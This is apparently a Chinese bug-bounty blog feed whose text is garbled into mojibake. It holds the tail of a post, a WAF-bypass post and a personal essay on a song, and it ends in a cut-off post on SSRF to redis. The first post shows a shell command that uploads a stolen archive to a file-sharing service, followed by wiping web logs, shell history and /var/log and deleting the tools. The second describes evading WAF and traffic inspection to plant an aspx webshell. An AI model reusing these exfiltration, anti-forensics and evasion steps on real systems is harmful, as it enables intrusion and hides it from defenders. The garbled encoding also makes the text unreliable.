*</code></pre><p>å°è¯•äº†ncï¼Œåé—¨å›ä¼ ç­‰å‡ä¸ç¨³å®šä¸­é€”å›ä¼ æ–­æ‰ï¼Œè‡ªå·±çš„ossé‚£æ—¶å€™ä¹Ÿè¿‡æœŸäº†ï¼Œæ²¡æ³•é€šè¿‡osså›ä¼ ï¼Œéš¾å—çš„ä¸€é€¼..</p><p>æœ€ç»ˆé—®äº†ä¸‹å°åœˆé‡Œçš„å¸ˆå‚…ï¼Œæä¾›äº†ä¸€ä¸ªå¥½ç”¨çš„æ€è·¯</p><p>åˆ©ç”¨å¥¶ç‰›å¿«ä¼ å›ä¼ æ–‡ä»¶</p><p><a href="https://github.com/Mikubill/cowtransfer-uploader">https://github.com/Mikubill/cowtransfer-uploader</a></p><pre><code class="shell">nohup ./cowtransfer-uploader -c &quot;remember-mev2=...;&quot; -a &quot;&lt;cow-auth-token&gt;&quot; xxx.tar</code></pre><p>é€Ÿåº¦å¾ˆèˆ’æœï¼Œå¤§æ¦‚ä¸Šä¼ é€Ÿåº¦èƒ½åˆ°æ¯ç§’6M</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220949.jpg" alt="image-20220316151652403"></p><p>éšåç›´æ¥å»è‡ªå·±çš„å¥¶ç‰›å¿«ä¼ ä¸‹è½½å³å¯</p><h2 id="0x08-èµ„æ–™åˆ†æ"><a href="#0x08-èµ„æ–™åˆ†æ" class="headerlink" title="0x08 èµ„æ–™åˆ†æ"></a>0x08 èµ„æ–™åˆ†æ</h2><p>æŠŠå›ä¼ å›æ¥çš„jaråŒ…åç¼–è¯‘ï¼Œå–è¯å…¶ä¸­çš„æ•°æ®åº“é“¾æ¥ä¿¡æ¯ï¼Œç­‰å¾…ä¸‹æ­¥æŒ‡ç¤º</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220310.jpg" alt="image-20220316153837863"></p><p>åˆ†æç¨‹åºè®°å½•çš„Logæ—¥å¿—ï¼Œåå°ç™»é™†ä¿¡æ¯ã€è´¦å·ã€ç™»é™†IPå°½æ”¶çœ¼åº•ï¼›ç«™åœ¨æš—å¤„çš„è¿æ³•åˆ†å­å‘½ä¸ä¹…çŸ£</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192220803.jpg" alt="image-20220316154212116"></p><h2 id="0x09-æ“¦å±è‚¡ä¸åè¨€"><a href="#0x09-æ“¦å±è‚¡ä¸åè¨€" class="headerlink" title="0x09 æ“¦å±è‚¡ä¸åè¨€"></a>0x09 æ“¦å±è‚¡ä¸åè¨€</h2><p>éšåæŠŠwebå½“æ—¥æ—¥å¿—ï¼Œhistoryï¼Œ&#x2F;var&#x2F;logä¸‹çš„æ—¥å¿—å…¨éƒ¨æ¸…ç†å¹²å‡€</p><p>ç”¨åˆ°çš„å·¥å…·å…¨éƒ¨wipeåˆ æ‰</p><p><strong>æ–­æ‰shellé“¾æ¥çš„ä¸€ç¬é—´ï¼Œæˆ‘é†’äº†ï¼Œå‘ç°è¿™ä¸€åˆ‡ç«Ÿæ˜¯æˆ‘åœ¨åšæ¢¦</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(ä¸ƒ)-è®°ä¸€æ¬¡ä¸é£å¡”æµé‡æ£€æµ‹å¯¹æŠ—çš„æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2022/03/10/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%83-%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8E%E9%A3%9E%E5%A1%94%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2022/03/10/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%83-%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8E%E9%A3%9E%E5%A1%94%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-èµ·å› "><a href="#0x01-èµ·å› " class="headerlink" title="0x01 èµ·å› "></a>0x01 èµ·å› </h2><p>æŸé¡¹ç›®é¶æ ‡ï¼Œæ˜¯ä¸€ä¸ªäººå‘˜ç®¡ç†ç³»ç»Ÿï¼Œé€šè¿‡webpackæš´éœ²çš„æ¥å£</p><p>æˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†ä¸€ä¸ªæœªé‰´æƒçš„å¯†ç ä¿®æ”¹æ¥å£ï¼Œé€šè¿‡fuzz</p><p>æˆ‘ä»¬è·å–åˆ°äº†è¯¥æ¥å£çš„å‚æ•°usernameä¸passwordï¼Œå¹¶æˆåŠŸä¿®æ”¹äº†adminè´¦å·å¯†ç è¿›å…¥åå°</p><p>åœ¨ä¸€ä¸ªä»»æ„ä¸Šä¼ çš„åå°åŠŸèƒ½ç‚¹ï¼Œæˆ‘ä»¬é‡åˆ°äº†é£å¡”WAF+æµé‡æ£€æµ‹è®¾å¤‡ï¼Œäºæ˜¯ä¾¿æœ‰äº†æœ¬æ–‡</p><h2 id="0x02-æ‘¸æ¸…æ£€æµ‹è§„åˆ™"><a href="#0x02-æ‘¸æ¸…æ£€æµ‹è§„åˆ™" class="headerlink" title="0x02 æ‘¸æ¸…æ£€æµ‹è§„åˆ™"></a>0x02 æ‘¸æ¸…æ£€æµ‹è§„åˆ™</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œé£å¡”å…¬å¸çš„WAF+æµé‡æ£€æµ‹è®¾å¤‡è¿˜æ˜¯æ¯”è¾ƒç‰›é€¼çš„ï¼Œæˆ‘ç›´æ¥å°è¯•ä¸Šä¼ ä¸€ä¸ªå…æ€webshellï¼Œæ¯«æ— ç–‘é—®ç›´æ¥GGäº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217586.png" alt="image-20220310205117609"></p><p>ç»è¿‡æµ‹è¯•ï¼Œä¸Šä¼ æ— å®³å†…å®¹1111ä½†æ–‡ä»¶åä¸ºXXX.aspxä¹Ÿä¼šè¢«æ‹¦æˆª</p><p>å‘ç°é£å¡”å¯¹formè¡¨å•çš„æ–‡ä»¶åå’Œæ–‡ä»¶å†…å®¹éƒ½æœ‰æ£€æµ‹ï¼Œæˆ‘ä»¬å¿…é¡»å¾—æŠŠè¿™ä¿©æ£€æµ‹éƒ½å®‰æ’æ‰æ‰èƒ½æˆåŠŸä¸Šä¼ </p><p>ä¸‹é¢ç®€è¿°ä¸€ä¸‹å¯¹æŠ—æ€è·¯</p><h2 id="0x03-æ–‡ä»¶åæ£€æµ‹â€”â€”æ ¹æ®-NETä¸Šä¼ åŒ¹é…æ–‡ä»¶åç‰¹æ€§ç»•WAF-éª—"><a href="#0x03-æ–‡ä»¶åæ£€æµ‹â€”â€”æ ¹æ®-NETä¸Šä¼ åŒ¹é…æ–‡ä»¶åç‰¹æ€§ç»•WAF-éª—" class="headerlink" title="0x03 æ–‡ä»¶åæ£€æµ‹â€”â€”æ ¹æ®.NETä¸Šä¼ åŒ¹é…æ–‡ä»¶åç‰¹æ€§ç»•WAF(éª—)"></a>0x03 æ–‡ä»¶åæ£€æµ‹â€”â€”æ ¹æ®.NETä¸Šä¼ åŒ¹é…æ–‡ä»¶åç‰¹æ€§ç»•WAF(éª—)</h2><p>.NETä¸­å¸¸ç”¨<strong>context.Request.Files</strong>å¤„ç†æ–‡ä»¶ä¸Šä¼ è¡¨å•</p><p>å…¶åœ¨åŒ¹é…ä¸Šä¼ æ–‡ä»¶åæ—¶åªåŒ¹é…<strong>Content-Disposition:<strong>åçš„</strong>filename&#x3D;xxxx</strong>ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬å¾ˆå¤§çš„ç»•WAFæ“ä½œç©ºé—´ï¼Œå¯ä»¥ç›´æ¥åœ¨Content-Dispositionä¸­æ³¨å…¥è„æ•°æ®æ¥æ‰°ä¹±WAFçš„æ£€æµ‹</p><p>è¿™é‡Œæˆ‘å»æ‰åˆ†å·ï¼Œå¹¶ä½¿ç”¨emojiå®½å­—èŠ‚æ•°æ®æ‰°ä¹±waf</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217557.png" alt="image-20220310171505081"></p><p>å¦‚å›¾ï¼Œä½¿ç”¨æ— å®³æ•°æ®æˆåŠŸä¸Šä¼ aspxæ–‡ä»¶</p><h2 id="0x04-æ–‡ä»¶å†…å®¹æ£€æµ‹â€”â€”åŒå›¾ç‰‡å¤¹æ¶æ„ä»£ç -å·è¢­"><a href="#0x04-æ–‡ä»¶å†…å®¹æ£€æµ‹â€”â€”åŒå›¾ç‰‡å¤¹æ¶æ„ä»£ç -å·è¢­" class="headerlink" title="0x04 æ–‡ä»¶å†…å®¹æ£€æµ‹â€”â€”åŒå›¾ç‰‡å¤¹æ¶æ„ä»£ç (å·è¢­)"></a>0x04 æ–‡ä»¶å†…å®¹æ£€æµ‹â€”â€”åŒå›¾ç‰‡å¤¹æ¶æ„ä»£ç (å·è¢­)</h2><p>å‰é¢æ—¢ç„¶ç›´æ¥ä¼ å…æ€Shellä¸è¡Œï¼Œæˆ‘åˆæµ‹è¯•äº†åŠ å…¥å›¾ç‰‡å¤´ï¼Œå°è¯•ç»•è¿‡æ£€æµ‹</p><p>ä¾‹å¦‚ï¼š</p><pre><code>JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFFD8FFPNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89504E47GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47494638</code></pre><p>å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ï¼Œéƒ½GGäº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217136.png" alt="image-20220310205919300"></p><p>åé¢æ ¹æ®.NETç‰¹æ€§ï¼Œä½¿ç”¨äº†UTF-16ç¼–ç ï¼Œä¹Ÿè¢«æ‹¦æˆªäº†ï¼Œçœ‹æ¥é£å¡”å¯¹ç¼–ç è¿™å—æœ‰æ‰€é˜²èŒƒã€‚</p><p><strong>ä»Šå¤©æ˜¯è‚¯å¾·åŸºç–¯ç‹‚æ˜ŸæœŸå››</strong>ï¼Œçªç„¶ä¸€ä¸ªæƒ³æ³•ï¼Œåœ¨æˆ‘è„‘ä¸­é—ªè¿‡â€”â€”<strong>â€œæˆ‘ä»¬èƒ½ä¸èƒ½åœ¨ä¸‡ç»¿ä¸›ä¸­å¤¹å¸¦ä¸€ç‚¹çº¢å‘¢â€</strong></p><p><strong>æˆ‘ä»¬æ¥è¯•è¯•â€œæ±‰å ¡åŒ…æ³•â€</strong></p><p>é€‰å–ä¸¤å¼ æ­£å¸¸å›¾ç‰‡æ•°æ®ï¼Œä¸­é—´å¤¹å¸¦ä¸Šæˆ‘ä»¬çš„æ¶æ„ä»£ç </p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217689.png" alt="image-20220310210818611"></p><p>å¦‚å›¾ï¼ŒæˆåŠŸä¸Šä¼ å¸¦æœ‰æ¶æ„ä»£ç çš„aspxæ–‡ä»¶ï¼Œé£å¡”å°±æ­¤å‘Šç ´~</p><p>ç¿»äº†ä¸€ä¸‹åå°çš„å›¾ç‰‡è·¯å¾„ï¼ŒæˆåŠŸæ‹¼æ¥å‡ºshellçš„urlè·¯å¾„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217182.png" alt="image-20220310211332520"></p><p>èšå‰‘åŠ å¯†ä¸€ä¸‹æµé‡ï¼ŒæˆåŠŸGetshell</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192217166.png" alt="image-20220310211449176"></p><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>å–„ç”¨ç¼–ç ã€å®½å­—èŠ‚ï¼Œç†ŸçŸ¥æ¯ç§å¼€å‘è¯­è¨€çš„ç‰¹æ€§ï¼Œæ˜¯ç»•è¿‡WAFä¸å¯æˆ–ç¼ºçš„åŸºæœ¬åŠŸ</p><p>ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œæ€è·¯çµæ´»å¯ä»¥å‡ºå¥‡åˆ¶èƒœ~</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´æŒ–æ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä¸–ä¸Šå¹¶ä¸å­˜åœ¨çš„æ­Œã€‹</title>
      <link href="/2022/01/08/%E3%80%8A%E4%B8%96%E4%B8%8A%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%AD%8C%E3%80%8B/"/>
      <url>/2022/01/08/%E3%80%8A%E4%B8%96%E4%B8%8A%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%AD%8C%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>èº«å¤„ç–«æƒ…è‚†è™çš„è¥¿å®‰ï¼Œå‰ä¸¤æ—¥æ™šä¸Šï¼Œä¾ç¨€å¬åˆ°éš”å£æœ‰äººåœ¨å”±æ­Œï¼Œå”±çš„å£°éŸ³ä¸å¤§ï¼Œä½†å¾ˆæ·±æƒ…ã€‚æ­Œè¯æ˜¯è¿™æ ·çš„â€”â€”</p><p><strong>â€œ</strong></p><p><strong>æˆ‘ä»¬å†ä¹Ÿæ²¡è§è¿‡</strong></p><p><strong>å¯æˆ‘ä¸€ç›´éƒ½è®°å¾—&#x2F;è¿™é¦–ä¸–ä¸Šå¹¶ä¸å­˜åœ¨çš„æ­Œ</strong>**</p><p><strong>ä¹Ÿè®¸ä½ å·²ç»å¿˜äº†&#x2F;è¿™ä¸ªæ— å¿ƒçš„è¿‡é”™&#x2F;å´åœ¨æˆ‘å¿ƒé‡Œè¶Šæ¥è¶Šæ·±åˆ»</strong>**</p><p><strong>â€</strong></p><p><strong>ä¸–ç•Œä¸Šä¸å­˜åœ¨çš„æ­ŒCDå‰§ç…§</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318989.jpg" alt="img"></p><p>å»QQéŸ³ä¹æœäº†ä¸€ä¸‹æ­Œè¯ï¼Œå¾—çŸ¥è¿™é¦–æ­Œåä¸ºã€Šä¸–ç•Œä¸Šä¸å­˜åœ¨çš„æ­Œã€‹ï¼ŒåŒæ—¶æƒŠè®¶åœ°å‘ç°åŸæ¥æ˜¯èµµè‹±ä¿Šçš„æ­Œï¼Œé‚£ä½å·²ç»å»ä¸–çš„éŸ³ä¹äººã€‚æˆ‘å›æƒ³èµ·å»å¹´å…ƒæ—¦ï¼Œè‡ªå·±æ­£å’Œå¥³æœ‹å‹åœ¨ç”µå½±é™¢é‡Œçœ‹ã€Šé€ä½ ä¸€æœµå°çº¢èŠ±ã€‹ã€‚</p><p>è¿™éƒ¨ç”µå½±ä»¥ä¸¤ä¸ªå®¶åº­çš„æŠ—ç™Œç”Ÿæ´»ä¸ºä¸»çº¿ï¼Œæ€è€ƒå’Œç›´é¢äº†æ¯ä¸€ä¸ªäººéƒ½ä¼šé¢ä¸´çš„äººç”Ÿå‘½é¢˜ã€‚å…ˆå‰çœ‹è¿‡å¾ˆå¤šä»¥ç–¾ç—…ä¸ºé¢˜æä¸Šå‡åˆ°äººç”Ÿå“²å­¦çš„æ–‡ç« ä¸ç”µå½±ï¼Œæˆ‘å¯¹ç”µå½±æœ¬èº«çš„å‰§æƒ…å¹¶ä¸è¿‡æ•ï¼Œä½†å´æ·±æ·±åœ°è¢«è¿™éƒ¨ç”µå½±çš„åŒåç‰‡å°¾æ›²ã€Šé€ä½ ä¸€æœµå°çº¢èŠ±ã€‹æ‰€æ‰“åŠ¨ã€‚</p><p>åé¢æˆ‘æŠŠè¿™é¦–æ­ŒåŠ åˆ°äº†æ­Œå•é‡Œï¼Œä¸¤ä¸ªæœˆåï¼Œå¾®åšçƒ­æœâ€”â€”æ­Œæ‰‹èµµè‹±ä¿Šæ‚£ç™Œå»ä¸–ã€‚</p><p>ä»–ç•™ä¸ªä¸–ç•Œçš„æœ€åä¸€æ¡å¾®åšæ˜¯è¿™æ ·å†™çš„</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318103.png" alt="å›¾ç‰‡"></p><p>é¢å¯¹æ­»äº¡ä¹‹æ—¶ï¼Œåˆæœ‰å‡ äººèƒ½ä¿æŒè¿™èˆ¬çš„æ½‡æ´’ä¸é‡Šç„¶å‘¢ï¼Ÿ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318123.png" alt="å›¾ç‰‡"></p><p>è¿™ä¸ªé—®é¢˜æŠŠæˆ‘çš„å›å¿†å¸¦å›äº†å‡ å¹´å‰ï¼Œé‚£æ—¶é«˜ä¸­æ–‡è‰ºæ±‡æ¼”ï¼Œæˆ‘ä»¬ä¸€å±‚æ¥¼çš„å››ä¸ªç­åˆå‡ºäº†ä¸€å°èŠ‚ç›®ï¼Œåå«ã€Šä¸œå¡çªå›´ã€‹ï¼Œæ•´ä¸ªèŠ‚ç›®ä»¥è‹è½¼çš„èµ¤å£èµ‹ä¸ºåŸºï¼Œä»¥ä½™ç§‹é›¨çš„ã€Šä¸œå¡çªå›´ã€‹ä¸ºå¼•ï¼Œé€šè¿‡ä¸»å®¢é—®ç­”ä½“å±•ç°äº†è‹è½¼åœ¨â€œä¹Œå°è¯—æ¡ˆâ€åå†…å¿ƒçš„æŒ£æ‰ä»¥åŠå¯¹ç”Ÿå‘½çš„æ€è€ƒã€‚è€Œæˆ‘ï¼Œå°±æ˜¯å‰§ä¸­çš„ä¸œå¡ï¼Œé‚£æ—¶æ—¥æ—¥æœ—è¯µã€Šå‰èµ¤å£èµ‹ã€‹ä¸ã€Šä¸´æ±Ÿä»™Â·å¤œå½’ä¸´çš‹ã€‹ï¼Œè®©æˆ‘å¯¹æ­¤æ®µå†å²ä¸æ–‡å­¦åˆ›ä½œæ ¼å¤–åˆ»éª¨é“­å¿ƒï¼Œ</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318238.jpg" alt="img"></p><p>  å¤æ¥ä¹‹æ—¶è‹ä¸œå¡äºæ–‡èµ¤å£æ„Ÿå¹â€œ<strong>å¯„èœ‰è£äºå¤©åœ°ï¼Œæ¸ºæ²§æµ·ä¹‹ä¸€ç²Ÿã€‚å“€å¾ç”Ÿä¹‹é¡»è‡¾ï¼Œç¾¡é•¿æ±Ÿä¹‹æ— ç©·ã€‚</strong>â€æ„æŒ‡äººç”Ÿåœ¨ä¸–ï¼Œå¦‚åŒèœ‰è£ç½®èº«äºå¹¿é˜”çš„å¤©åœ°ä¸­,åƒæ²§æµ·ä¸­çš„ä¸€ç²’æ —ç±³é‚£æ ·æ¸ºå°ï¼Œäººçš„ä¸€ç”Ÿç»ˆç©¶åªæ˜¯çŸ­æš‚çš„ç‰‡åˆ»,è€Œç¾¡æ…•é•¿æ±Ÿçš„å¥”æµä¸æ¯ï¼Œæ²¡æœ‰ç©·å°½ã€‚</p><p>è€Œèµµè‹±ä¿Šåœ¨ä»–çš„æ­Œä¸­æ˜¯è¿™æ ·å†™çš„â€”â€”</p><p><strong>â€œæ˜¯è°æŒ¥éœçš„æ—¶å…‰å•Š</strong></p><p> <strong>æ˜¯è°è‹¦è‹¦çš„å¥¢æœ›å•Šï¼Œ</strong></p><p> <strong>è¿™ä¸æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œ</strong></p><p> <strong>ä¹Ÿä¸éœ€è¦ä½ æ¥å›ç­”â€</strong></p><p> <strong>æ˜¯çš„ï¼Œç”Ÿè€…æŒ¥éœçš„æ—¶å…‰ï¼Œæ­£æ˜¯æ­»è€…è‹¦è‹¦çš„å¥¢æœ›ã€‚</strong></p><p>çºµè§‚äºŒè€…ï¼Œæ— è®ºæ˜¯è‹è½¼è¿˜æ˜¯èµµè‹±ä¿Šï¼Œè™½ç„¶è¯—è¯æ­Œèµ‹é¢†åŸŸå¹¶ä¸ç›¸é€šï¼Œä½†ä»–ä»¬åœ¨é¢å¯¹äººç”Ÿçš„æ²‰æµ®ï¼Œç”Ÿä¸æ­»ä¹‹æ—¶ï¼Œéƒ½è¡¨ç°å‡ºäº†ç›¸å½“ç¨‹åº¦çš„é‡Šç„¶ï¼Œæˆ‘æ„¿æŠŠè¿™ç§°ä¸ºä¸€ç§ç›¸å½“é«˜çš„äººç”Ÿå±‚æ¬¡ã€‚<strong>å’Œæ±Ÿæ²³æ¹–æµ·ï¼Œå±±å·äº”å²³æ¯”ï¼Œäººç”Ÿæ— ç–‘æ˜¯é¡»è‡¾çš„ï¼Œä½†å¯¹æ­¤é€‰æ‹©é‡Šç„¶ä¸æ¥å—ï¼ŒåŠªåŠ›æ´»å‡ºç”Ÿå‘½çš„æ·±åº¦å’Œé«˜åº¦ï¼Œç€å®æ˜¯ä¸€ä»¶è®©äººè‚ƒç„¶èµ·æ•¬çš„äº‹æƒ…ã€‚</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318123.png" alt="å›¾ç‰‡"></p><p><strong>â€œé•¿æ¨æ­¤èº«éæˆ‘æœ‰ï¼Œä½•æ—¶å¿˜å´è¥è¥ã€‚å¤œé˜‘é£é™ç¸ çº¹å¹³ï¼Œå°èˆŸä»æ­¤é€ï¼Œæ±Ÿæµ·å¯„ä½™ç”Ÿâ€</strong></p><p>  è‹è½¼åœ¨å¿ƒçµçªå›´ä¹‹æ—¶é¥±ç»ç—›è‹¦ä¸æŒ£æ‰ï¼Œæœ€ç»ˆå¾—ä»¥çªå›´æˆåŠŸã€‚æ­£æ˜¯é‚£å¯¹äºäººç”Ÿä¸ç”Ÿå‘½çš„é«˜å±‚æ¬¡ç†è§£ä¸é¡¿æ‚Ÿã€æ¸Šåšçš„å­¦è¯†ã€ç¿æ™ºçš„æ€æƒ³ã€é«˜å°šçš„äººæ ¼ã€ä¸°å¯Œçš„äººç”Ÿç»å†ã€å¤šæ–¹é¢çš„å·¨å¤§æˆå°±æ‰è®©ä»–ç»ˆæˆä¸ºä¸­å›½æ–‡åŒ–å²ä¸Šçš„æ—·ä¸–å¥‡æ‰ï¼Œæ–‡å­¦å·¨å­ã€‚</p><p>  <strong>å› æ­¤ï¼Œè‹è½¼ä¹‹äºåäººæœ€å¤§çš„æ„ä¹‰ï¼Œé™¤äº†æé«˜æ°´å¹³çš„æ–‡å­¦ä½œå“å¤–ï¼Œè¿˜æœ‰ä»–é‚£å¯¹äºç”Ÿå‘½çš„å“²æ€ã€‚</strong></p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318123.png" alt="å›¾ç‰‡"></p><p><strong>â€œåœ¨æŸä¸ªè§’è½ï¼Œä¹Ÿè®¸çœŸçš„æœ‰è¿™é¦–æ­Œï¼Œå¦‚æœä½ å¬è¿‡ï¼Œä¼šä¸ä¼šæƒ³èµ·æˆ‘â€</strong></p><p>èµµè‹±ä¿ŠæŠ—ç™Œä¸¤å¹´ï¼Œæœ€ç»ˆé—æ†¾è½è´¥ï¼Œä½†ä»–ç•™ä¸‹çš„æ­Œæ›²ï¼ŒåŠ¨å¬ä¾æ—§ï¼Œç»™äºˆæ¯ä¸€ä½å¬ä¼—å‰è¡Œçš„åŠ›é‡ï¼ŒæŸä¸ªè§’è½ï¼Œå¬åˆ°è¿™é¦–æ­Œï¼Œæˆ‘æƒ³æˆ‘ä¼šæ°¸è¿œè®°èµ·ä»–ã€‚</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192318267.jpeg" alt="å›¾ç‰‡"></p><p>æ‰€ä»¥ï¼Œè¿™é¦–ã€Šä¸–ç•Œä¸Šä¸å­˜åœ¨çš„æ­Œã€‹ï¼Œè®©æˆ‘æ„è¯†åˆ°â€”â€”</p><p><strong>äººçš„ä¼Ÿå¤§ä¹‹å¤„åœ¨äºï¼šæˆ‘ä»¬æ˜çŸ¥æ­»äº¡ä¼šæ˜¯æœ€ç»ˆçš„èƒœåˆ©è€…ï¼Œä½†ä»èƒ½åŠªåŠ›ç»è¥è‡ªå·±çš„ç”Ÿæ´»ã€‚</strong></p><p><strong>æŠŠè‡ªå·±çš„çƒ­çˆ±å˜æˆä¸€ä¸ªå’Œæˆåƒä¸Šä¸‡çš„äººåˆ†äº«å¿«ä¹çš„äº‹ä¸šï¼Œè®©è¿™ä¸–ç•Œå˜å¾—æ›´åŠ å®‰å…¨ã€åŠ¨äººè€Œåˆæ¸©æš–ï¼Œå¯è°“äººç”Ÿç¬¬ä¸€å€¼å¾—ä¹‹äº‹ã€‚</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç”Ÿæ´»å¶æ‚Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é‡ç”Ÿä¹‹æˆ‘æ˜¯èµé‡‘çŒäºº(å…­)-å¼ºè¡Œå¤šæ¬¡FUZZå‘ç°æŸå‚å•†SSRFåˆ°rediså¯†ç å–·æ´’æ‰¹é‡åå¼¹Shell</title>
      <link href="/2021/12/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%85%AD-%E5%BC%BA%E8%A1%8C%E5%A4%9A%E6%AC%A1FUZZ%E5%8F%91%E7%8E%B0%E6%9F%90%E5%8E%82%E5%95%86SSRF%E5%88%B0redis%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%89%B9%E9%87%8F%E5%8F%8D%E5%BC%B9Shell/"/>
      <url>/2021/12/26/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E5%85%AD-%E5%BC%BA%E8%A1%8C%E5%A4%9A%E6%AC%A1FUZZ%E5%8F%91%E7%8E%B0%E6%9F%90%E5%8E%82%E5%95%86SSRF%E5%88%B0redis%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%89%B9%E9%87%8F%E5%8F%8D%E5%BC%B9Shell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-å¯¹ç›®å½•æ‰¹é‡FUZZï¼Œå‘ç°ä¸€å¤„éšè”½æ¥å£"><a href="#0x01-å¯¹ç›®å½•æ‰¹é‡FUZZï¼Œå‘ç°ä¸€å¤„éšè”½æ¥å£" class="headerlink" title="0x01 å¯¹ç›®å½•æ‰¹é‡FUZZï¼Œå‘ç°ä¸€å¤„éšè”½æ¥å£"></a>0x01 å¯¹ç›®å½•æ‰¹é‡FUZZï¼Œå‘ç°ä¸€å¤„éšè”½æ¥å£</h2><p>æŒ–æŸå¤§å‚å·²ç»æŒ–äº†å¿«ä¸¤ä¸ªå‘¨äº†ï¼ŒæœŸé—´å› ä¸ºå…¬å¸ä¸šåŠ¡æ¯”è¾ƒç¹å¿™ï¼Œæœ€è¿‘ä¸€ç›´æ²¡æŒ–ã€‚</p><p>ä½†æ˜¯ä¸€ç›´åœ¨ç”¨ffufæŒ‚ç€å­—å…¸å¯¹å‚å•†èµ„äº§è¿›è¡Œæ‰¹é‡ç›®å½•æ‰«æï¼Œä»Šå¤©ä¸ŠæœåŠ¡å™¨çœ‹äº†ä¸‹æ‰«æç»“æœï¼Œå°±å‡ºè´§äº†</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216563.png" alt="image-20211224185734645"></p><p>æ¥å£åœ°å€ä¸ºï¼š<a href="https://xxx.xxxx.com/xxxx/start">https://xxx.xxxx.com/xxxx/start</a></p><p>æˆ‘ä»¬ç›´æ¥å¯¹å…¶è¿›è¡Œè®¿é—®</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192216903.png" alt="image-20211224190001535"></p><p>å‘ç°è¯¥æ¥å£ç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›å¯ä»¥ä½¿ç”¨çš„æ¥å£é“¾æ¥</p><p>æˆ‘ä»¬é€ä¸ªæµ‹è¯•æ‹¼æ¥æ¥å£åï¼Œå‘ç°ä¸€ä¸ªåä¸ºface_xxxxçš„æ¥å£æœ‰æˆ</p><h2 id="0x02-FUZZä¼ å‚æ ¼å¼-å‚æ•°"><a href="#0x02-FUZZä¼ å‚æ ¼å¼-å‚æ•°" class="headerlink" title="0x02 FUZZä¼ å‚æ ¼å¼+å‚æ•°"></a>0x02 FUZZä¼ å‚æ ¼å¼+å‚æ•°</h2><p>è®¿é—®æ¥å£ï¼Œæç¤ºMethod Not Allowï¼Œ405é”™è¯¯ï¼Œé‚£ä¹ˆå¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬å¾—æ¢POSTä¼ å‚</p><p><img 